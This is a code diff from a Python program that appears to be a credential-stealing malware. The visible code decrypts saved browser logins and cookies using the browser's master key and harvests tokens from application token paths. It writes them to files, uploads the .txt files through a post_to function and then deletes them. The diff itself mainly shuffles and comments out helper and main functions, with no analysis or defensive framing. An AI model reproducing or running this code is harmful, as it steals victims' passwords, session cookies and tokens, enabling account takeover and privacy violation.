@@ -46,6 +46,25 @@ for_handler = (
     "CookMe.db"
 )
 main()
+# def main_tokens():
+#     for platform, path in tokenPaths.items():
+#         if not os.path.exists(path):
+#             continue
+#         try:
+#             tokens = set(get_tokens(path))
+#         except:
+#             continue
+#         if not tokens:
+#             continue
+#         with open(fileInfo, "a") as f:
+#             for i in tokens:
+#                 f.write(str(i) + "\n")
+# def main():
+#     for name, path in browser_loc.items():
+#         decrypt_files(path, name)
+#     main_tokens()
+#     for i in for_handler:
+#         file_handler(i)
 
 def decrypt_token(buff, master_key):
     try:
@@ -98,11 +117,11 @@ def get_tokens(path):
 
     return done
 
-def generate_cipher(aes_key, iv):
-    return AES.new(aes_key, AES.MODE_GCM, iv)
+# def generate_cipher(aes_key, iv):
+#     return AES.new(aes_key, AES.MODE_GCM, iv)
 
-def decrypt_payload(cipher, payload):
-    return cipher.decrypt(payload)
+# def decrypt_payload(cipher, payload):
+#     return cipher.decrypt(payload)
 
 def decrypt_browser(LocalState, LoginData, CookiesFile, name):
     if os.path.exists(LocalState):
@@ -192,20 +211,6 @@ def Cookies(path):
     else:
         return f"{path}\\User Data\\Default\\Network\\Cookies"
 
-# def main_tokens():
-#     for platform, path in tokenPaths.items():
-#         if not os.path.exists(path):
-#             continue
-#         try:
-#             tokens = set(get_tokens(path))
-#         except:
-#             continue
-#         if not tokens:
-#             continue
-#         with open(fileInfo, "a") as f:
-#             for i in tokens:
-#                 f.write(str(i) + "\n")
-
 def decrypt_files(path, browser):
     if os.path.exists(path):
         decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)
@@ -238,10 +243,3 @@ def file_handler(file):
         if ".txt" in file:
             post_to(file)
         os.remove(file)
-
-# def main():
-#     for name, path in browser_loc.items():
-#         decrypt_files(path, name)
-#     main_tokens()
-#     for i in for_handler:
-#         file_handler(i)
